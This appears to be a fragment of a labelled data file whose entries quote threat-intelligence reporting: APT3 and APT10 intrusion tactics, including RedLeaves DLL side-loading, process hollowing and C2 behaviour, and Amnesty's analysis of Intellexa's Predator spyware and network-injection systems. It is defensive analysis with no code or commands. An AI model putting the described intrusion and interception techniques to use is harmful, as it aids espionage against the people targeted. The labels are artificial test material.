from related commands in APT3’s tools, they’ve been known to use “net view” and dsquery to do so. This may be due to a lack of available information on how APT3 operates during an operation since most reports tend to be focused on forensic information. Pirpi has commands that list servers in the domain, list TCP connections and retrieve connected users (T1049 - Network Connections Discovery), and list Domain Controllers (T1018 - Remote System Discovery). Some of this information may be used to identify target hosts for lateral movement. In addition to built-in Windows utilities, there are some open source tools which collect similar information. APT3 will quickly spread to other machines as fast as possible, often checking for easy password reuse by trying to mount shares from other machines via “net use” [T1078 – Valid Accounts] [T1077 - Windows Admin Shares] [T1110 – Brute Force]. APT3 uses a custom tool called RemoteCMD that can run commands on a remote system. It’s not clear what protocol(s) are being used, but RemoteCMD supports file operations (upload, download, delete and rename) service operations (creation, deletion, start and stop) and scheduled tasks (AT,schtasks). Presumably these are done over SMB (files), Remote Service (services) and Remote Schtasks (AT). It’s likely that APT3 will compromise a network to a certain degree of satisfaction before starting to exfil, due to stealth concerns. Depending on the defensive setup, exfiltration could be much noisier and noticeable than attempting to hide in the noise with lay-of-the-land tools. The only source we were able to find for APT3 exfiltration methods is from 2012. For exfiltration, they will identify Office documents on the computer [23] [T1005 - Data from Local System]. They then drop the command-line Chinese language version of WinRAR and use it to compress and encrypt the discovered documents [T1002 - Data Compressed]. This archive will then be stored in the recycle bin [23], usually on a machine designated as a staging server, which they move the exfiltration through [T1074 - Data Staged]. Data is exfiltrated over port 443 which is typically HTTPS traffic, however they have used SSL encryption [17] and normal HTTP [23] [T1043 - Commonly Used Port].\n\n\n",

        "explain": "iDefense analysts have identified recent campaigns attributed to APT10, also known as HOGFISH and Stone Panda. This report provides a technical overview of the bespoke RedLeaves implants leveraged by the actor in their “new battle” campaign. iDefense is providing information about this reported campaign to the general iDefense customer base so that customers are aware of the modus operandi of a highly active threat group that is targeting institutions for espionage purposes, especially in Japan. More specifically, this threat analysis is intended for security operations center (SOC) analysts and engineers. Intelligence analysts may also want to read this report. Additionally, management and executive leadership may want to use this information. SOC analysts and engineers can use this threat analysis detailed information pertaining to the workings of a malware family and indicators of compromise (IoCs) to contain or mitigate the discussed threat through monitoring or blocking. SOC analysts can use the information provided in the Analysis and Mitigation sections of this IA to conduct hunting activities on systems that may have already been compromised. Analysts and security engineers can use the IoCs by adding them to hunting lists on Endpoint Detection and Response (EDR) solutions as well as network- and host-based blacklists to detect and deny malware implantation and command-and-control (C2) communication. Intelligence analysts may want to use the information provided in this IA to better inform their own analyses. The provided information can also help inform ongoing intelligence analyses and forensic investigations, particularly for compromise discovery, damage assessment, and attribution. Management and executive leadership may use this information to assess the risks associated with the threat described herein to make operational and policy decisions accordingly. Knowledge of the tactics, techniques, and procedures (TTPs) used by the operators behind this campaign helps to better inform detection and response to attacks by this threat group. The sample that iDefense analyzed for this report is a Word document with Japanese filename, 2018年度（平成30年度）税制改正について.doc, which translates to English as “About the 2018 fiscal year (Heisei 30) tax system revision.doc”. This document has the following propertiesAfter the document is opened, the victim is presented with a message from Office 365 to asking the victim to “Enable content” (see Exhibit 1). On the next page, however, iDefense identified what appears to be a base64-encoded string.As mentioned earlier, this malware creates two new binaries: AYRUNSC.exe and PTL.AYM. AYRUNSC.exe is a legitimate and digitally signed binary created by ESTsoft Corp. and pertains to ALYac, Korean anti-virus software. PTL.AYM is in fact another binary file; specifically, it is a DLL file with the following properties: The compiled time stamp, assuming it is not altered, suggests the actor developed the implant 2 days before launching the described campaign. This DLL is a clone of a legitimate DLL, also by ALYac, and corresponds to the anti-virus software’s Utility Module. However, rather than the original DLL, it only has two imports as the authors have implemented a simple, single-byte XOR obfuscation (using key 0x40) to obfuscate other imports and strings. For example, XOR decoding the binary reveals the following two interesting strings:Three exported functions clearly stood out: Initialize_IjDEJK, NbhgHUxiGf, and rGBKikBeJObSwSjY. These are, however, all dummy exports to throw off analysts or perhaps even taunt researchers, and more specifically perhaps to taunt the Japan Computer Emergency Response Team Coordination Center (JPCERT/CC). For example, when executing the DLL file by calling the NbhgHUxiGf export function, the victim would be prompted with a Windows message box with “jpcert-1”, as can be shown in Exhibit 3 and 4.All other functions are either empty or also filled with calls to MessageBoxA(), which is unusual for DLL loading implants. However, one export function, GetFolderPathNew2, is responsible for loading the RedLeaves DLL implant by performing process hollowing in iexplore.exe, Microsoft Corp.’s default browser. The initial process, AYRUNSC.exe, is unable to work correctly and will therefore exit. For persistence, RedLeaves will add a shortcut “.lnk” file in the user’s Startup folder, which points to `AYRUNSC.exe’, as shown in Exhibit 5.Once running, the RedLeaves implant will then attempt to communicate with the following C2 domains, using HTTP, but connects to the C2 server on port 443:The configuration settings for the RedLeaves implant can be extracted from memory and contains the following information: The string “2018-1-8-NewBattle” refers to the campaign ID set up by the actor and may allude the actor starting a “new battle” (campaigns). The malware will create a unique version of the aforementioned mutex on the victim machine in order to avoid running the implant twice. As mentioned before, RedLeaves will attempt to communicate over HTTP, using POST requests with a hardcoded User-Agent:Further analysis also reveals that the RedLeaves implant described corresponds to the actor’s “Lavender” version of the malware family. For example, the strings “LAVENDERX” and “LAVENDERengin” (which are dynamically built on the stack) are used to determine the implant’s version.\n\n\n",

Several threat actors leverage the technique of using Windows certutil.exe for payload decoding, and APT10 continues to employ this technique. These are sent via POST request, as shown in Figure 9.While APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving. This backdoor is well-known in the security community as ANEL, and it used to come in beta or RC (release candidate) until recently.

        "original_label": "true",
        "label": "true",
        "explain": "a major global investigation – the “Predator Files” – was published exposing the proliferation of surveillance technologies around the world and the failure of governments and the European Union (EU) to properly regulate the industry. The Security Lab at Amnesty International is a technical partner in the “Predator Files”, a project coordinated by the European Investigative Collaborations (EIC) media network into the Intellexa alliance, the makers and marketers of the Predator spyware. As part of this collaboration, the Security Lab has reviewed technical documentation, marketing material and other records obtained by Der Spiegel and Mediapart – who are part of EIC – which shed light on the ecosystem of surveillance products offered by the Intellexa alliance. The Intellexa alliance is an evolving group of companies and brands that have been involved in developing and marketing a wide range of surveillance products including advanced spyware, mass surveillance platforms, and tactical systems for targeting and intercepting nearby devices. The corporate entities of the alliance span various jurisdictions, both within and outside the EU. The exact nature of links between these companies is shrouded in secrecy as corporate entities, and the structures between them, are constantly morphing, renaming, rebranding, and evolving. In the same vein, the products marketed by Intellexa have been rebranded and renamed numerous times, as various Intellexa alliance entities have worked together to combine product development and marketing activities. This report provides an overview of the distinct products and “attack vectors” offered by this surveillance alliance, including a product glossary to help clarify the analysis where multiple product names were used to describe the same product line over time. This report does not endeavour to describe every product in exhaustive detail, but rather to provide an overview of known or significant products. The goal of this research is also to provide an understanding of the potential impact of the described attack techniques, without making a judgement on the effectiveness of individual products, since marketing material can often overstate the effectiveness of commercial products. Technical specifications and marketing material from surveillance vendors is often kept secret. The resulting information asymmetry prevents defenders in the cybersecurity industry and at-risk civil society groups from understanding the full scope of threats that they face. The aim of this research is to provide concrete information about surveillance capabilities available from this one vendor in the commercial surveillance market. We hope that this report can be a resource for the cybersecurity community and major mobile device and technology vendors. Our recommendations section outlines possible mitigations and detections which can help protect potential civil society targets and the wider internet ecosystem from some of the attack vectors described here.There is an ongoing high-stakes race between the vendors of smartphones and other devices we rely on and actors who are invested in subverting these systems for surveillance purposes. Mercenary spyware companies continuously develop and refine their tactics to adapt to expanding security mitigations introduced by vendors, to evade detection and to diversify their offering for customers with different operational and legal requirements. For many years, researchers and security practitioners publicly observed so called ‘1-click’ attack vectors. Although the specifics vary between different types of attacks and exploits, the common characteristic of 1-click attacks, as demonstrated by their name, is the requirement for the target to unwittingly perform an interaction which triggers the exploitation process. To ensure the target initiates the process, attackers typically need to employ some form of ‘social engineering’. For example, a common ‘1-click’ attack vector involves delivering a malicious link via email, SMS or instant messenger apps with a tailored message to trick the victim into clicking on the malicious link. Just one click can be enough to deliver an exploit for their mobile browser. As well as requiring interaction from the target, 1-click attacks also often leave behind visible traces which are useful for researchers and security practitioners to discover the attempted attack, and possibly even reconstruct which particular mercenary spyware system was involved in the attack. The past five years saw the advent of so-called “zero-click” attacks. Such attacks – by definition – do not require any action on behalf of the target. The absence of tell-tell links also makes it much more difficult for a target to learn of the attack attempt without an in-depth forensic analysis of their device. Fewer traces and forensic evidence also make it exceedingly difficult for any independent authorities to investigate cases of abuse of these products. This lack of independent oversight capability for advanced attacks including ‘zero-clicks’ also makes it more difficult, if not impossible, to reconcile the use of these tools with human rights requirements. For these reasons ‘zero-click’ has become the tactic of choice for mercenary spyware companies and their customers. Higher reliability, lower risk of discovery, and situational adaptability have made zero-click attacks an in-demand cyber passe-partout, and an ongoing challenge for digital defenders and technology vendors alike. These attacks can come in different forms and target different network and software attack surfaces. In the last few years, several zero-click exploit chains have been discovered leveraging vulnerabilities in messaging platforms such as iMessage and WhatsApp, which can be used as the entry point to fully compromise the device. For example, a vulnerability in image parsing code, reachable in Apple’s iMessage image preview feature, can be used to silently deliver a first-stage attack to an unsuspecting target. Without any link to click, the target is unlikely to notice that anything untoward has happened. Due to increased scrutiny from security researchers and technology vendors like Apple and Google, the development of full zero-click exploit chains which enable full system compromise are becoming ever more costly to develop and more fragile to maintain. Public pricing lists from a major exploit broker offer up to $2.5 million USD for a full chain, although information available to the Security Lab from industry sources suggests the true cost to a government wishing to buy such a full-chain capability off-the-shelf is more than double this price, if such a full chain is available. Recent explosive reporting from Haaretz has revealed how cyber-surveillance companies are racing to subvert and exploit the already invasive digital advertising ecosystem to target and infect mobile devices globally using ad-network powered “zero-clicks”. Spyware companies are borrowing hyper-targeting techniques from the already rights abusing ad-tech industry to enable their customers to infect targets as they are simply browsing a legitimate website. These new developments add urgency to the human rights case for banning the surveillance-based advertising model, which already undermines a number of human rights, even before being paired with highly invasive mercenary spyware. As long as government demand for such invasive spyware tools and resulting profits from the mercenary surveillance industry remain high, we will continue to see a drive towards exploiting the essential shared internet infrastructure that the public relies on. However, these “remote zero-click” attacks are not the only tactic that researchers and security practitioners have observed recently. Attackers with privileged access to a target’s mobile or Wi-Fi network can leverage this vantage point to automatically redirect the target to an infection page. This tactic is commonly referred to as a “network injection”. Companies like Hacking Team and FinFisher pioneered the commercialisation of network injections over a decade ago. While early systems often involved injecting malicious executable files, current generations of these tools have evolved to use increasingly advanced exploits and vectors in response to generational change in mobile security and other network protocols. Surveillance companies have productised a range of tactical equipment to mimic cell towers and to infiltrate Wi-Fi networks and even covert network equipment to physically install upstream in mobile networks and Internet service providers. Ultimately, they all aim to intercept the traffic generated by the target device, typically HTTP, hijack it, and then silently redirect the targets’ web browser to an exploitation site. In this way, attackers can leverage more common 1-click exploits in browsers such as Chrome and Safari, but still silently infect a target without needing user interaction. For example, while reading through their social media feed, a user might decide to read an article from a legitimate local news website, and inadvertently get their phone infected as a result. Just opening one HTTP link to the news website could give the attacker the split-second opportunity needed to redirect to a spyware infection page. The network injection attack and the subsequent exploitation can happen automatically and there is nothing, other than perhaps navigating over a VPN, that the target could have done to prevent it. Because of this, network injection-based products have become lucrative options in mercenary spyware companies’ offerings, appealing especially to customers who have legal or coercive power over a country’s telecommunications infrastructure. While such systems may be operationally complex to install initially, once deployed, a surveillance operator can easily integrate with new infection solutions which create an ongoing threat. Intellexa’s spyware and attack vectors The Intellexa alliance has built and commercialised a comprehensive suite of tactical and zero-click network injection products – marketed under the Intellexa brand – which accompany the sale of their flagship spyware, Predator. In the following section we detail the technical capabilities of Predator itself, and the wide range of supporting Intellexa products designed to deliver the Predator spyware to targeted mobile devices through the interception and subversion of mobile networks, Wi-Fi and the internet. Our aim in this analysis is to provide concrete information to policy makers, product vendors, security researchers and civil society to help understand and develop defences against these dangerous attack vectors.Predator – A highly invasive spyware ecosystem The Security Lab’s analysis of brochures and technical documents provided by EIC provides new insight into how this spyware functions on a technical level and the methods by which it infects targets’ devices. Much of this information is published today for the first time as part of the “Predator Files”. The Intellexa alliance’s mobile spyware, mostly commonly known as “Predator”, is a form of highly invasive spyware that by default gains total access to all data stored or transmitted from the target’s device, and that is designed to leave no traces on the target device, which would render any independent audit of potential abuses impossible. Predator spyware infections are managed via a web-based system which Intellexa terms the “Cyber Operation Platform”. Spyware operators can also use this interface to initiate attack attempts against a target phone, and if successful, to retrieve and access sensitive information including photos, location data, chat messages and microphone recordings from the infected device. The full Predator system includes a number of distinct software and infrastructure components. These include the spyware agent itself, which is installed on the target’s device, and the software exploits and attack vectors necessary to install the spyware covertly on the target’s phone.The alliance has used several marketing names since 2018 to describe its mobile spyware products including ‘Green Arrow’ for their Android spyware agent and ‘Red Arrow’ for their iOS spyware agent. More recently, Intellexa has marketed its spyware system as ‘Predator’ and ‘Helios’, among others. In this report, we refer to this overall mobile spyware product as Predator as we believe all of these product names refer to the same set of broadly related spyware technology originally developed by the North Macedonian company Cytrox, which later became part of the Intellexa alliance.The Predator user interface documented publicly for the first time in the “Predator Files” is structurally and visually similar to an earlier Predator interface briefly shown in Intellexa’s infamous “spy van” during a 2019 Forbes interview between Thomas Brewster and Intellexa founder Tal Dilian.The “Predator Files” disclosures reveal how exploit code and spyware payloads are delivered to the target device from what Intellexa terms its “installation server”. Once a phone is infected with the Predator agent, it connects to the command and control (CNC) network where the operators can issue commands to the Predator spyware agent, such as to retrieve certain files or to activate the microphone. As shown in the Predator architecture diagram (Figure 5), exfiltrated data is also transferred back from the infected device via the CNC anonymisation network with the aim of obscuring the location and identity of the spyware operator, making it more difficult for researchers to identify the source and nature of the attacks.Multiple leaked commercial proposals for the Predator spyware system provide insights on the economics of the end-to-end mercenary spyware industry. The New York Times published a 2021 commercial offer for Predator in December 2022. A more recent commercial offer for ‘NOVA’, an Intellexa alliance combined spyware and data analysis system, was leaked on the XSS.is cybercrime forum in 2022 and later republished online. While commercial demand is one factor in spyware pricing, these leaked proposals also provide a proxy metric to evaluate the difficulty of attacking modern smartphones and building a maintainable commercial product capable of conducting such attacks. The commercial offerings license a base system with the Predator Android and iOS surveillance agents along with optional add-ons. These commercial add-ons include the ability to target devices outside the customer’s country, to maintain an infection of a device between reboots (termed “persistency”) and to increase the “magazine” limiting the total number of successful infections allowed in the system. This 2022 commercial proposal only advertises 1-click attacks, with 10 concurrent live agents (simultaneously infected devices) and 100 successful infections. The offer is restricted to domestic targeting only. A series of trainings for future operators of the spyware system is also included in the proposal.Persistency is offered through an additional license for €3 million euro with support for both iOS and Android, although the 2022 proposal cautions that the persistent infection would not survive a factory reset and would not prevent version updates on the device. Additionally, if international targeting is required, the “Nova international” add-on is available for an additional 1.2 million euro which would give access to 5 additional countries to be mutually agreed upon, with no geographic limitation of target location. The 2022 proposal also includes a condition that “Delivery is subject to export and/or import control certification by the relevant European authorities, as applicable”. In the earlier 2021 proposal published by the New York Times, a separate add-on for an additional “magazine” with 100 successful infections was priced at €900,000. From this commercial licencing we can infer a lower bound cost per infection of at least €9000 euro per successful infection for this particular spyware system. This cost per infections is likely to increase each year as the challenge of developing and maintaining reliable exploit chains for modern mobile devices becomes increasingly difficult. While the cost of these attacks tools and individual attacks is significant, we are not yet at the point where these tools are economically unfeasible for States to deploy against civil society and human rights defenders. Both previously published commercial proposals and additional material available in the “Predator Files” investigation focus on 1-click attacks using malicious links. Indeed, the 2022 Predator commercial proposal explicitly describes the product as a “remote 1-click browser-based capability to inject Android and iOS payload to mobile devices through link delivery”. However, in the following section we will demonstrate how such 1-click attack capabilities can be integrated with other surveillance systems to enable more covert and dangerous infection options. One Intellexa alliance document outlines its various approaches for delivering these attacks to the target. These include: Strategic ISP infection – described as “0-click through HTTP browsing”. Tactical infection (WiFi and GSM) – described as 0-click through HTTP browsing. Avatars platform – anonymous accounts or “bots” on social media or instant messaging apps can be used to send 1-click links to targets. The Intellexa “Mars” product is a network injection system installed at mobile operator ISPs which allows a Predator customer to silently redirect targeted users to a Predator infection server after browsing any HTTP web page. This enables a 1-click browser exploit to be used as a “zero-click”.Network injection systems rely on the targeted user eventually opening a link to any legitimate unencrypted HTTP URL. The network injection system can respond to the original HTTP request with a HTTP redirect containing a to a 1-click browser exploit link which infects the device without further user action. Network injection systems in effect allow 1-click exploits to be used as no-interaction pseudo zero-clicks. Such a system is not truly remote as it requires the target’s internet traffic to be transferred over a network that the spyware operator can monitor. As more websites deploy HTTPS encryption, potential targets will tend to make fewer unencrypted HTTP requests, resulting in network injection systems taking longer to successfully inject and redirect a target. The Mars solution consists of two distinct components: a physical Mars server deployed at each Mars-enabled mobile internet service provider (ISP), and a Mars administration system used by the surveillance operator to define targets and launch attacks across the Mars enabled ISPs. In the Mars product specifications, Intellexa acknowledges that the product “requires full cooperation from the ISP for the integration and operation”, as such these types of network injection systems can only be used to target devices domestically in a country or devices which are roaming with traffic being forwarded through the Mars-enabled ISP. The reviewed Mars product documentation describes targeting of devices based on a static IP address assigned to the target subscriber rather than based on a phone number (or MSISDN). Targeting based on a phone number would require closer integration between the Mars system and the mobile operator’s identity and user account systems which may make Mars deployment more complex. Each mobile ISP must assign a static internal IP to the potential targets identified by the operator. The MARS operator can then enable targeted redirection and infection of devices connected through the system. The cooperating ISP must also set up forwarding rules on the ISP gateway router to forward traffic from the predefined target IP addresses to the Mars system for traffic collection and manipulation. In the described scenario, the Mars system would act as a man-in-the-middle (MITM) inline system rather than a man-on-the-side (MOTS) system.Previous investigations have shown that the ISP-level (strategic) network injection infrastructure has been used to infect targeted mobile users with advanced spyware tools. In 2019, Amnesty International documented network injection attacks being used in Morocco to infect human rights defenders and journalists with NSO Group’s Pegasus spyware. The Citizen Lab documented a functionally similar system being used to target a political opposition figure in Egypt with Intellexa’s Predator spyware in September 2023. The Citizen Lab investigation determined with “high confidence” that the network injection system used to deliver Predator infection links in Egypt was a Sandvine PacketLogic device. Earlier network measurements and research showed that Sandvine systems capable of network injection have been deployed in Egyptian networks since at least 2018. From initial research, the Mars system offered by the Intellexa alliance appears to be a different product to the Sandvine system identified in Egypt. However, more research is needed to characterise this system, its original manufacturer and to identify Mars systems deployed in the wild.The Intellexa alliance “Jupiter” product is an add-on for the Mars network injection system. The product documentation available as part of the “Predator Files” claims the system allows surveillance operators to also perform network injection into targets’ encrypted HTTPS traffic. The product is only able to inject “pre-enabled” domestic websites.The Jupiter documentation states that “SSL encryption has left intelligence agencies with no solution for interception and infection during SSL traffic”. The Jupiter system aims to subvert the HTTPS ecosystem to also enable network injection attacks on some encrypted traffic. The product material explains that interception is limited to “local websites” hosted at an ISP in the customer country. The Jupiter hardware needs to be installed on a hosting providers network gateway or an ISP upstream from the domestic hosting provider where the local target website is running. Once Jupiter is installed, the operators need to perform a “one-time procedure”, called a “Jupiter Operation”, which involves redirecting traffic for the target website from “specific international IPs” allowing the target website to be enrolled into the system. A diagram of the combined Mars and Jupiter systems is shown in Figure 11.Each local website that the “Jupiter Operation” is performed on will be added to the “Jupiter List” and becomes “approved for infection for a certain duration”. A “median server” is responsible for communications between the Jupiter and Mars servers and maintains the “Jupiter List”. This technical documentation suggests that the Jupiter system relies on using a man-in-the-middle network position to obtain a valid TLS certificate for the targeted local website. Certificate authorities allow a number of challenge types to validate that an entity requesting a TLS certificate indeed controls the domain in question. These challenges include a “HTTP challenge” which verifies that a specific validation file is available on a website at a particular URL path, and a TLS challenge which checks that a website returns a specifically formatted TLS certificate. With the Jupiter system installed at the hosting provider, the Jupiter customer can man-in-the-middle verification requests sent from the international IP ranges used by the TLS certificate authorities to verify the domain verification challenge. As the attacker chosen certificate authority receives a valid challenge response, it will allow the certificate request and in turn issue a valid TLS certificate to the Jupiter operator which is a valid and trusted for the target website. The TLS certificate issued during the “Jupiter Operation” can then be loaded in the “Median server” and in the “Mars systems” installed at each mobile operator ISP. Once the certificate has been issued, the Mars operator can actively man-in-the-middle encrypted HTTPS requests sent from a target to the local website without further interaction with the hosting provider network. This man-in-the-middle position can then be used to network inject browser exploit code inside the connection to the legitimate website.Triton is a zero-click tactical infection product which can be used to compromise Samsung devices in a range of hundreds of meters through their cellular baseband.The Triton system is a tactical infection vector which the Intellexa alliance’s marketing material claims can infect many recent models of Samsung devices including “the latest models with the latest operating system versions”. The system appears to target vulnerabilities in baseband software used in Samsung devices which allows infection with the Predator spyware with “no interaction with the target” or the need for the target to use a browser or any other app. The attack involves a number of distinct steps. First, an IMSI catcher is used to downgrade target Samsung devices from 5G, 4G or 3G to the legacy 2G protocol. The documentation explains that the downgrade attack can be performed with an Intellexa alliance IMSI catcher product or with a third-party IMSI catcher which supports such downgrade attacks.Once the target phone is downgraded to 2G, a separate 2G base station transceiver (BTS) – likely a software defined radio integrated with the Triton product – is used to deliver the attack payload over a ‘specific 2G radio channel’. The sales brochure claims the full spyware agent installation can take up to 3 minutes and be performed over distances ranging up to hundreds of meters.In March 2023, Google Project Zero published research documenting numerous fully remote zero-click vulnerabilities uncovered during their analysis of the Samsung Exynos baseband chipset and firmware used in many recent Samsung devices. The Intellexa brochure claims that the Triton attack is effective against many recent models of Samsung devices. Based on the description of the affected device models and version, it is likely that Triton also targets vulnerabilities in the Exynos baseband software and in particular its 2G networking code. Unfortunately, the documentation available during this investigation does not include enough technical details to pinpoint the exact vulnerability or attack surface exploited by this product. It is unclear if Triton exploits a memory corruption vulnerability or if the baseband is manipulated to trigger a browser and pivot to a 1-click browser attack.SpearHead is a range of Wi-Fi interception systems originally developed by WiSpear is a member of the Intellexa alliance. SpearHead products allow target identification and geo-location, traffic interception, and network injection to deliver spyware payloads.EIC documents and previous reporting outline a range of SpearHead products which can be carried in a briefcase, mounted on a drone or installed in a “surveillance van”, the SpearHead 360. Intellexa alliance brochures claim the system is built around a Wi-Fi radio unit with a “digital adaptive beam-forming antenna” which allows for Wi-Fi signals to be “accurately geo-located based on direction of arrival (DoA) calculations”. The vehicle-based SpearHead 360 system can also be paired with the backpack or drone mounted SpearHead to create “ad-hoc tactical networks” which, according to the marketing material, can be used to triangulate and accurately geo-locate the exact location of emitted Wi-Fi signals over large distances. In addition to Wi-Fi geolocation, the system also advertises methods for “advanced manipulation of WiFi communications and protocols” and multiple strategies to perform man-in-the-middle attacks which they term “active WiFi interception”. The SpearHead systems promises integration with “back office systems” such as password cracking clusters which can allow for the brute-force calculation of Wi-Fi passwords where the network password is unknown. The system also includes a feature which uses “WiFi protocols to extract the device’s IMSI”. This feature may involve exploiting a publicly known information leakage flaw in WiFi calling (VoWifi) implementations. The Intellexa material claims that their Wi-Fi interception systems is fully integrated with multiple “infection and data extraction systems” such as Intellexa’s Predator. The SpearHead Wi-Fi interception devices can be used to perform network injection attacks on connected Wi-Fi devices and redirect to 1-click spyware infection links.Alpha-Max is a 3G/4G interception system originally developed by the Nexa group and marketed by the Intellexa alliance. Advertised features include the ability to identify handset identifiers (such as the target IMSI), listen to calls, block and modify text messages and intercept the data connection of any potential target in its vicinity.The marketing material, which – based on described software versions – appears to have been written in 2019 and explains that the Alpha-MAX surveillance system works on the principle of mobile roaming. It consists of two integrated components, a 4G IMSI catcher and a 3G mobile base station (referred to as an eNodeB). Due to what was described as a “lack of 4G roaming agreements” at the time, target devices must first be downgraded from 4G to 3G using a built-in IMSI catcher. The Alpha-Max system must be connected to the international SS7 network through a dedicated system called the “Alpha-Max provider system” that allows routing of calls, data and text messages. The documentation also says that, at the time, the provider system is “delivered with existing connectivity”, done through several Mobile Network Operators (MNO). When the target is connected to the Alpha-Max 3G base station it authenticates to the virtual mobile network provider of the Alpha-Max. This allows the device to continue to communicate normally while allowing the operator to intercept the traffic. In the 3G protocol the handset authenticates the cell tower, and it is no longer possible for an attacker to spoof an arbitrary mobile operator. The Alpha-Max system uses the legitimate network roaming feature and collaboration with mobile network operators to trick the device into roaming to another network. The backend signalling (SS7, and likely Diameter) connection allows the attacker-linked mobile network operator to send roaming requests to the targets’ home mobile operator and to request the necessary cryptographic keys to authenticate the handset. In a disclaimer, the product material explains that the “Alpha-Max is working based on roaming, all target mobile phones must be capable of roaming (i.e. roaming enabled). If not roaming enabled, this specific SIM card cannot be a target intercepted by the Alpha-Max”. As with previous products, the Alpha-Max system is also advertised with spyware injection integration. The brochure describes how EPSILON, a “man-on-the-side” (MOTS) system can be used to manipulate target IP packets, perform a network injection into the targets traffic, and ultimately “place malware on the target’s phone”.While encryption of networked communications has become ubiquitous in many regions over the last decade, before that, large portions of Internet traffic was transmitted unencrypted and without protection. Until 2010 major email providers like Gmail and Yahoo did not employ any in-transit encryption at all for user content and served their websites over plain HTTP. In this environment, passive bulk interception technologies where highly effective, and for years were a cornerstone of the early digital surveillance industry’s product offering. Numerous surveillance companies built and sold mass telephone and internet systems which were deployed to intercept traffic on a whole-country level. These allowed governmental operators to select and monitor at will telephone communications, web traffic, email or messaging alike.The Amesys EAGLE deep-packet inspection technology was first documented in 2006 and marketing material describes its ability to parse and analyse a range of network protocols including web browsing and email traffic. The EAGLE DPI system integrated with GLINT, which was a product that Amesys describes as a “global strategic system” for collecting and analysing telephone and network traffic in bulk for entire countries. Amesys, whose products were later integrated into the Intellexa alliance, also marketed a set of portable and tactical products including SMINT. SMINT was a transportable computer which could be connected to a target IP network to monitor and collect traffic. Marketing brochures previously published by Wikileaks show that Amesys also offered the SMINT system with additional EAGLE probe modules to integrate ADSL, WiFi and satellite sensors. Nexa Technologies was founded in 2012 and took over the surveillance business of Amesys and their existing product lines. The new business entity also renamed the core mass surveillance product EAGLE to the new CEREBRO brand. The new CEREBRO mass surveillance product was integrated with a range of sensor “probes” including the ALPHA series of over-the-air GSM interception products, GAMMA for telephone monitoring, IOTA for internet traffic collection, SIGMA for satellite interception and the OMEGA open-source intelligence system.The golden age of internet mass surveillance technologies such as EAGLE and CEREBRO later faced critical challenges. In 2013, Edward Snowden’s groundbreaking disclosures exposed the unchecked global interception of Internet traffic by the National Security Agency of the United States and its allies. In response, technology vendors and major platforms demonstrated new commitment to rolling-out strong encryption in their products and services. Within a short number of years, the usage of HTTPS by major websites skyrocketed. Today, for example, large parts of web traffic are encrypted by default.As a result, traditional bulk and mass surveillance products have become less effective as the content of communications suddenly became unavailable. The increased adoption of encryption is one likely driver for the increased demand for endpoint monitoring solutions, such as spyware. While network encryption protects from wiretapping of data in transit, attackers who can successfully compromise target device can still access content, including end-to-end encrypted communications in cleartext.As internet traffic was increasingly encrypted, companies such as Nexa group started to offer new product lines such as JASMINE, which focused on analysing the metadata of encrypted traffic apps with a particular focus on messaging applications. In its targeted interception mode – which starts from a single target – JASMINE has claimed it is able to identify communicating parties in encrypted but peer-to-peer applications such as Skype, which create direct network connections between participants. Additionally the JASMINE documentation explicitly claims support for identifying the IP addresses of participants in encrypted apps such as WhatsApp and Signal during voice and video calls where peer-to-peer connections are also used for calling by default. The JASMINE documentation also explains that by analysing encrypted traffic “events” for a whole country – in mass interception mode – JASMINE has the ability to correlate and identify the participants in encrypted group chats on messaging apps, with specific support analysing WhatsApp chat conversations. Such a metadata analysis system can record the distinctive network traffic pattern each time a phone receives a new encrypted message or notification from a chat application such as WhatsApp or Telegram. Over time, with dozens or hundreds of messages received, the correlation between these notification events for multiple individuals will get stronger. Eventually these systems can, with a high degree of confidence, determine which phones in the country are consistently receiving a notification at the same time, therefore indicating the phones and individuals which are likely members of the same encrypted messenger chat group. Recent reporting from the New York Times revealed how states, for example Russia, are developing and deploying similar internet traffic analysis systems to track the users of encrypted messaging applications in the country. This is not an abstract risk; other commercial surveillance vendors such as Sandvine have reportedly developed and advertised similar surveillance capabilities to government customers such as Algeria and Belarus.Such encrypted traffic analysis systems can also be used to identify anonymous users who upload content on social media in a country. We can imagine a scenario where a protester uses Instagram to post videos of police violence or other rights violations on a pseudoanonymous Instagram channel. The upload will be encrypted with HTTPS, however, the file size of the uploaded video file and upload time is still visible to an observer recording network traffic metadata via surveillance systems deployed at their mobile operator. The authorities could use a traffic correlation tool, similar to JASMINE, to search network logs for all mobile users who uploaded a large file to Instagram’s servers shortly before the video appeared on the Instagram channel. While this search may be noisy, and provide a large pool of possible targets, each new uploaded video would provide more data points, which let the operator narrow down the list of suspects. Unfortunately, technical attacks such as the traffic correlation approaches described here tend to become more effective as this technology develops. This is an area where advances in machine learning and AI could make such statistical correlation attacks more reliable and practical for governments to deploy indiscriminately, in order to monitor mass internet traffic and ultimately infer information about human social networks and connections at a nation-wide scale.The aspiration is that the information shared in this report is actionable by civil society technologists and device vendors to make informed decisions about threat models and to prioritise possible security defences and mitigations. Unfortunately, technical fixes cannot solve this problem alone. Our private devices and digital public spaces will remain threatened until we have a global regulatory system in place with robust regulation of the cyber-surveillance industry, and which provides justice and accountability to those harmed by these products.Major technology vendors and device manufacturers should urgently continue efforts to harden their products and services against the advanced exploits and attacks described in this report. This includes making 1-click browser attacks more difficult to develop and more brittle to maintain. It is valuable for technology vendors to continue to detect and fix such 1-click exploits being used in the wild. Remote zero-click attack surfaces, basebands, and other radio interfaces which can be exploited in close-access tactical attacks, should also be considered as an actively exploited attack surface. The following recommendations are possible mitigations: Provide an enhanced protection options for individuals who are at high risk from sophisticated attacks such as those described, in particular human rights defenders. While the number of people targeted from these tools may be a small percentage of the overall user pool, the harms resulting from these threats can be severe. To defend against network injection attacks, browser vendors should offer a HTTPS-only mode, as a user configurable option, or built in to enhanced protection mode like Apple’s Lockdown Mode. The user impact of such a feature may be higher in some regions with lower HTTPS penetration. Vendors should consider disabling legacy network protocols such as 2G, or providing some mechanisms to make downgrade attacks more difficult or visible. To defend against roaming-based attacks on 3G or 4G, vendors should consider providing a user visible prompt or approval process before the device connects to a new or previously unknown roaming network. Such a feature may be easier to deploy as an optional feature in an enhanced protection mode. It may also be possible to perform some on-device validation of the new roaming network location, notifying the user if the new moibile country code (MCC) is too geographically distant from the current network location to be implausible for a legitimate roaming handover. To defend against traffic correlation attacks, messaging apps and push notification services should consider traffic correlation attacks as practical real-world attacks which are deployed against their users and include this in their threat models. Some simple mitigations such as small timing delays in notifications, adding cover traffic or sending fixed size messages may help to significantly weaken the accuracy of these types of attacks. More open research is needed to analyse possible mitigations against these correlation attacks.The 